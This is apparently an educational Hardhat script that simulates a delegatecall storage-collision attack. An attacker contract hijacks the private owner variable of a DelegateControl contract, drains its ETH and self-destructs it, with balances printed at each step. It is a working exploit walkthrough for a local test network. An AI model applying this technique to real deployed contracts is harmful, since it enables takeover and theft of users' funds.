//
// @dev Simulate a delegatecall misuse attack
// @description Delegatecall is a low level func, we recommend using it as little
// as possible. In this sample, attacker uses DelegateControl's fallback to
// delegatecall LuckyNum's whoIam func. Since whoIam func changes the variable
// _user in the slot1, DelegateControl private variable _user which also be
// located at slot1 will be set as contract AttackDelegate address(msg.sender)
// The simple flow chart as below...
// AttackDelegate changeOwner func == [call()] ==> DelegateControl fallback func
//      == [delegatecall()] ==> LuckyNum whoIam func
//
// @reference https://learnblockchain.cn/article/4125
//

const { ethers } = require('hardhat');

async function main() {
    const [ owner, user1, attacker] = await ethers.getSigners();

    const LuckyNum = await ethers.getContractFactory('LuckyNum', owner);
    const lucky = await LuckyNum.deploy();
    await lucky.deployed();

    const DelegateControl = await ethers.getContractFactory('DelegateControl', owner);
    const delegate = await DelegateControl.deploy(
        lucky.address,
        {value: ethers.utils.parseEther('5.0')}
    );
    await delegate.deployed();

    const AttackDelegate = await ethers.getContractFactory('AttackDelegate', attacker);
    const attack = await AttackDelegate.deploy(delegate.address);
    await attack.deployed();

    // owner check DelegateControl contract balance
    console.log(`=== Owner init setting ===`);
    console.log(`Check DelegateControl contract balance: ${ethers.utils.formatEther(await delegate.ownedETH())} ETH`);
    console.log(`Owner recharge 1 ETH to LuckyNum contract...`);
    await delegate.connect(owner).recharge();
    console.log(`Contract LuckyNum balance: ${ethers.utils.formatEther(await lucky.ownedETH())} ETH\n`);

    // user1 play LuckyNum game
    console.log(`=== User1 plays LuckyNum game ===`);
    let num = await lucky.connect(user1).getMyLuckyNumber();
    console.log(`user1 gets his lucky number: ${num}`);
    console.log(`Obviously, user1's lucky number is not equal to the best lucky number:(\n`);
    // @notice revert tx when user1's number is not equal to best lucky number
    // console.log(`user1 want to get reward...`);
    // await lucky.connect(user1).rewardLucky(num);
    
    console.log(`=== Attacker uses 'delegatecall' to change contract DelegateControl private variable '_owner' ===`);
    console.log(`attacker checks own balance: ${ethers.utils.formatEther(await attacker.getBalance())} ETH`);
    console.log(`attacker checks contract AttackDelegate balance: ${ethers.utils.formatEther(await attack.connect(attacker).ownedETH())} ETH`);
    console.log(`attacker attacks contract DelegateControl...`);
    await attack.connect(attacker).changeOwner();
    console.log(`Contract DelegateControl private variable '_owner' is contract AttackDelegate address:)`);
    console.log(`attacker use contract AttackDelegate to call DelegateControl's destructMyself func...`);
    await attack.connect(attacker).earnETH();
    console.log(`Again: contract AttackDelegate balance is ${ethers.utils.formatEther(await attack.connect(attacker).ownedETH())} ETH`);
    console.log(`attacker destructs contract code and withdraws all tokens...`);
    await attack.connect(attacker).goodbye();
    console.log(`Again: attacker balance is ${ethers.utils.formatEther(await attacker.getBalance())} ETH`);

}

main()
    .then(() => process.exit(0))
    .catch((err) => {
        console.error(err);
        process.exit(1);
    });